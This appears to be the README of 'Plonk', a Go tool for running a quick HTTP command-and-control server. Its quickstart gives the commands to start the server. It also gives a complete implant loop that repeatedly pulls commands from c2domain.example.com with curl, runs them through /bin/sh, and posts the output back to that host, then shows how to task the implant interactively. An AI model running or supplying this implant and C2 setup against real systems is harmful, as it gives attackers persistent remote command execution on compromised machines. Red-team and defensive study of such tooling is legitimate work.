Plonk HTTP C2 and Static File Server
====================================
Plonk is a little HTTP(s) server program you can just plonk down and use for
quick'n'dirty C2ish infrastructure.  It serves static file and can serve
rudimentary tasking and take output.

Quickstart
----------
1. Start the C2 server
```bash
go install github.com/magisterquis/plonk@latest
plonk -h
plonk -letsencrypt c2domain.example.com
```
2. Get an implant going on target
```bash
while :; do
        curl -s https://c2domain.example.com/t/kittens | \
        /bin/sh | \
        curl --data-binary @- -s https://c2domain.example.com/t/kittens
        
        sleep 15
done
```
3. Tasking and output
```bash
plonk -interact kittens
ps awwwfux
```


Features
--------
- HTTP
- HTTPS with
  - Self-signed certificate generation
  - Automatic certificate provisioning with Let's Encrypt
  - Easy usage of custom certificates
- Static file server
- Tasking over HTTP
- Task output logging
- Simple interactive interface

Installation
------------

Usage
-----
